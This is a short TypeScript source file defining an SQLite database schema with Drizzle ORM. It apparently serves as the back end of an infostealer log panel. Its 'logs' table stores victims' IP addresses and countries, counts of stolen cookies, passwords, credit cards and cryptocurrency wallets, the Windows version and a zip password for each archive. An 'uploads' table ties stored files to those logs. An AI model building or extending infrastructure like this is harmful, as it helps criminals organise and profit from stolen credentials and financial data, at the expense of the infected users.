import { randomUUIDv7 } from "bun";
import { int, sqliteTable, text } from "drizzle-orm/sqlite-core";

export const usersTable = sqliteTable("users", {
    id: text().primaryKey().$defaultFn(() => randomUUIDv7()),
    name: text().notNull().unique(),
    password: text().notNull(),
    role: text().notNull().default('user'),

    createdAt: int('created_at').notNull().$defaultFn(() => Date.now()),
    updatedAt: int('updated_at').notNull().$defaultFn(() => Date.now()).$onUpdateFn(() => Date.now())
})

export const logsTable = sqliteTable('logs', {
    id: text().primaryKey().$defaultFn(() => randomUUIDv7()),
    userId: text().notNull().references(() => usersTable.id, { onDelete: 'cascade' }),

    name: text().notNull(),
    ip: text().notNull(),
    country: text().notNull(),

    cookies: int().notNull(),
    passwords: int().notNull(),
    creditcards: int().notNull(),
    cryptocurrencies: int().notNull(),
    windowsVersion: text('windows_version').notNull().default(''),
    zipPass: text('zip_pass').notNull().default(''),

    createdAt: int('created_at').notNull().$defaultFn(() => Date.now())
})

export const uploadsTable = sqliteTable('uploads', {
    id: text().primaryKey().$defaultFn(() => randomUUIDv7()),
    userId: text().notNull().references(() => usersTable.id, { onDelete: 'cascade' }),
    logId: text('log_id').references(() => logsTable.id, { onDelete: 'cascade' }),
    filename: text().notNull(),
    originalName: text('original_name').notNull(),
    size: int().notNull(),
    createdAt: int('created_at').notNull().$defaultFn(() => Date.now())
})
